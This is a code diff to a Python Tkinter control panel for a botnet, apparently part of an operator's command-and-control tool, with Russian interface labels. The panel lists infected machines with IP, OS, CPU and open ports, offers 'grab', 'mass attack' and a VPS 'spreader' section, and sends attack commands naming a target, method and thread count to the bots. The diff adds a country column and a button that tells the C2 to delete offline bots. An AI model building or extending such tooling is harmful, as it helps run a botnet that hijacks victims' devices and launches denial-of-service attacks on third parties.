@@ -44,13 +44,14 @@ class BotnetTab(ttk.Frame):
         ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
+        ttk.Button(ctrl, text="Удалить оффлайн", command=self.delete_offline_bots).pack(side=tk.LEFT, padx=2)
         ttk.Label(ctrl, text="Фильтр:").pack(side=tk.LEFT, padx=(20,5))
         self.filter_var = tk.StringVar(value="Все")
         self.filter_combo = ttk.Combobox(ctrl, textvariable=self.filter_var, values=["Все", "Online", "Offline"], width=10, state='readonly')
         self.filter_combo.pack(side=tk.LEFT)
         self.filter_combo.bind('<<ComboboxSelected>>', lambda e: self.refresh_bots())
 
-        columns = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen", "open_ports")
+        columns = ("ip", "hostname", "os", "type", "country", "cpu", "ram", "status", "rps", "last_seen", "open_ports")
         tree_frame = ttk.Frame(bot_frame)
         tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
@@ -254,7 +255,7 @@ class BotnetTab(ttk.Frame):
         elif filter_val == "Offline":
             bots = [b for b in bots if b.get("status") != "online"]
         if self.sort_col:
-            idx = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen", "open_ports").index(self.sort_col)
+            idx = ("ip", "hostname", "os", "type", "country", "cpu", "ram", "status", "rps", "last_seen", "open_ports").index(self.sort_col)
             bots = sorted(bots, key=lambda x: x.get(self.sort_col, ""), reverse=not self.sort_asc)
         for item in self.tree.get_children():
             self.tree.delete(item)
@@ -283,8 +284,9 @@ class BotnetTab(ttk.Frame):
                     device_type = "iPhone/iPad"
                 else:
                     device_type = "Неизвестно"
+            country = bot.get("country", "")
             open_ports_str = ", ".join(map(str, bot.get("ports", []))) if bot.get("ports") else ""
-            values = (ip, bot.get("hostname",""), bot.get("os",""), device_type,
+            values = (ip, bot.get("hostname",""), bot.get("os",""), device_type, country,
                       bot.get("cpu",""), bot.get("ram",""), status,
                       bot.get("rps",0), bot.get("last_seen",""), open_ports_str)
             self.tree.insert("", "end", values=values, tags=(tag,))
@@ -370,6 +372,16 @@ class BotnetTab(ttk.Frame):
             return
         self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(online_bots)}")
         messagebox.showinfo("Массовая атака", f"Команда отправлена на {len(online_bots)} ботов")
+
+    # ----- Удаление оффлайн ботов -----
+    def delete_offline_bots(self):
+        if not messagebox.askyesno("Удаление", "Удалить всех оффлайн-ботов?"):
+            return
+        # Отправляем команду на C2 для удаления (добавим обработчик в C2 позже, пока просто скрываем из GUI)
+        offline_ips = [ip for ip, bot in self.bots.items() if bot.get("status") != "online"]
+        for ip in offline_ips:
+            self._send_raw(f"delete:{ip}")
+        self.refresh_bots()
 
     # ----- Спредер на VPS -----
     def _on_local_changed(self):
